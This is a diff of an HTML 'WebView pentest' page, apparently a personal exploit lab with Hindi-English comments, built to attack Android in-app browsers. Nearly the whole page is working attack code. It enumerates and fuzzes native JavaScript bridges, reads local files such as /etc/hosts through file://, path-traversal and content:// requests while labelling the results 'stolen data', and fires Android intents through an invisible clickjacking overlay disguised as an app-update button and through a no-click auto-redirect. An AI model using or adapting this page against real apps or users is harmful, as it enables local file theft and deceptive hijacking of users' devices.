@@ -1,77 +1,110 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>WebView Exploit Lab</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phantom WebView Lab</title>
     <style>
-        body { font-family: sans-serif; background: #121212; color: #00ff00; padding: 20px; }
-        button { background: #333; color: #00ff00; border: 1px solid #00ff00; padding: 10px; width: 100%; margin: 10px 0; cursor: pointer; }
-        .log { background: #000; padding: 10px; border: 1px dashed #555; height: 150px; overflow-y: scroll; font-size: 12px; color: #00ff00; }
-        h3 { color: #fff; border-bottom: 1px solid #333; padding-bottom: 5px; }
+        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #39ff14; padding: 20px; line-height: 1.5; }
+        .card { border: 1px solid #333; padding: 15px; margin-bottom: 20px; border-radius: 5px; background: #111; box-shadow: 0 0 10px rgba(0,255,0,0.1); }
+        h2 { color: #fff; font-size: 1.2rem; margin-top: 0; text-transform: uppercase; border-bottom: 1px solid #333; padding-bottom: 10px; }
+        button { background: #1a1a1a; color: #39ff14; border: 1px solid #39ff14; padding: 10px 15px; cursor: pointer; width: 100%; margin: 5px 0; font-weight: bold; transition: 0.3s; }
+        button:hover { background: #39ff14; color: #000; }
+        .log-area { background: #000; color: #00ff00; padding: 10px; height: 120px; overflow-y: auto; border: 1px solid #222; font-size: 0.8rem; margin-top: 10px; }
+        .ghost-btn { position: relative; width: 100%; height: 50px; background: #444; color: white; display: flex; align-items: center; justify-content: center; border-radius: 5px; cursor: pointer; overflow: hidden; }
+        .hidden-intent { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <h3>1. Bridge & Object Discovery</h3>
-    <button onclick="findBridges()">Scan for Native Bridges</button>
+    <h1 style="text-align:center; color:#fff;">WEBVIEW PENTEST v2.0</h1>
 
-    <h3>2. File System Access (Sensitive Paths)</h3>
-    <button onclick="stealFile('/etc/hosts')">Read /etc/hosts</button>
-    <button onclick="stealFile('file:///sdcard/Download/test.txt')">Read SD Card File</button>
+    <div class="card">
+        <h2>1. JS Bridge Fuzzer</h2>
+        <button onclick="scanBridges()">Automated Bridge Scan</button>
+        <button onclick="fuzzCommonBridges()">Fuzz Known Bridges (JSON)</button>
+        <div id="bridge-log" class="log-area">Ready to scan...</div>
+    </div>
 
-    <h3>3. Intent & Settings Hijacking</h3>
-    <button onclick="triggerIntent('intent:#Intent;action=android.settings.SETTINGS;end')">Open Phone Settings</button>
-    <button onclick="triggerIntent('intent:#Intent;action=android.settings.WIFI_SETTINGS;end')">Open WiFi Settings</button>
-    <button onclick="triggerIntent('intent://instagram.com/#Intent;scheme=https;package=com.instagram.android;end')">Force Launch Instagram</button>
+    <div class="card">
+        <h2>2. File System Traversal</h2>
+        <button onclick="tryFileAccess('file:///etc/hosts')">Read /etc/hosts</button>
+        <button onclick="tryFileAccess('file://../../../../etc/hosts')">Path Traversal (../)</button>
+        <button onclick="tryFileAccess('content://com.android.htmlfileprovider/sdcard/Download/test.html')">Content Provider Test</button>
+        <div id="file-log" class="log-area">Waiting for request...</div>
+    </div>
 
-    <h3>Logs:</h3>
-    <div id="log" class="log">Waiting for action...</div>
+    <div class="card">
+        <h2>3. Ghost Intent (Click-Jacking)</h2>
+        <p style="font-size: 0.7rem; color: #888;">Niche wale button pe click kar, par khulegi settings (Invisible Overlay).</p>
+        <div class="ghost-btn">
+            CLICK TO UPDATE APP
+            <a href="intent:#Intent;action=android.settings.SETTINGS;end" class="hidden-intent"></a>
+        </div>
+        <button onclick="autoTrigger()">Instant Auto-Redirect (No Click)</button>
+    </div>
 
     <script>
-        function log(msg) {
-            const l = document.getElementById('log');
-            l.innerHTML += "<br>> " + msg;
-            l.scrollTop = l.scrollHeight;
+        function log(id, msg) {
+            const el = document.getElementById(id);
+            el.innerHTML += `<br>> [${new Date().toLocaleTimeString()}] ${msg}`;
+            el.scrollTop = el.scrollHeight;
         }
 
-        // 1. Bridges dhoondne ke liye
-        function findBridges() {
-            log("Scanning window objects...");
+        // --- Bridge Scanner ---
+        function scanBridges() {
+            log('bridge-log', 'Searching for native interfaces...');
             let found = [];
-            for (let i in window) {
+            const blacklist = ['window', 'document', 'location', 'top', 'parent', 'chrome'];
+            Object.getOwnPropertyNames(window).forEach(prop => {
                 try {
-                    if (window[i] !== null && typeof window[i] === 'object' && i !== 'window' && i !== 'document') {
-                        found.push(i);
+                    if (window[prop] && typeof window[prop] === 'object' && !blacklist.includes(prop)) {
+                        found.push(prop);
+                        log('bridge-log', 'FOUND: ' + prop);
                     }
                 } catch(e) {}
-            }
-            log("Potential Bridges: " + found.join(", "));
+            });
+            if(found.length === 0) log('bridge-log', 'No custom bridges detected.');
         }
 
-        // 2. File read karne ke liye (XHR exploit)
-        function stealFile(path) {
-            log("Attempting to read: " + path);
-            var xhr = new XMLHttpRequest();
+        function fuzzCommonBridges() {
+            const bridges = ['iabjs_unified_bridge', 'JSInterface', 'Android', 'controller'];
+            bridges.forEach(b => {
+                if(window[b]) {
+                    log('bridge-log', `Fuzzing ${b}...`);
+                    // Sending payload to check for crashes or leaks
+                    try { window[b].postMessage('{"type":"debug","payload":"{{7*7}}"}', '*'); } catch(e) {}
+                }
+            });
+        }
+
+        // --- File Access ---
+        function tryFileAccess(path) {
+            log('file-log', 'Attempting access to: ' + path);
+            let xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
-                if (xhr.readyState == 4) {
-                    if(xhr.responseText) {
-                        log("SUCCESS! Data: " + xhr.responseText.substring(0, 100) + "...");
-                        alert("Stolen Data: " + xhr.responseText);
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200 || xhr.responseText.length > 0) {
+                        log('file-log', '<span style="color:cyan">SUCCESS! Data leaked.</span>');
+                        alert("Data from " + path + ":\n\n" + xhr.responseText.substring(0, 200));
                     } else {
-                        log("FAILED: No access or file not found.");
+                        log('file-log', 'Failed. Access Denied.');
                     }
                 }
             };
-            xhr.open("GET", path, true);
-            xhr.send();
+            try {
+                xhr.open("GET", path, true);
+                xhr.send();
+            } catch(e) {
+                log('file-log', 'Error: ' + e.message);
+            }
         }
 
-        // 3. Intent trigger karne ke liye
-        function triggerIntent(url) {
-            log("Triggering Intent: " + url);
-            window.location.href = url;
+        // --- Auto Trigger ---
+        function autoTrigger() {
+            log('bridge-log', 'Attempting Auto-Intent trigger...');
+            window.location.href = "intent:#Intent;action=android.settings.WIFI_SETTINGS;end";
         }
     </script>
-
 </body>
 </html>
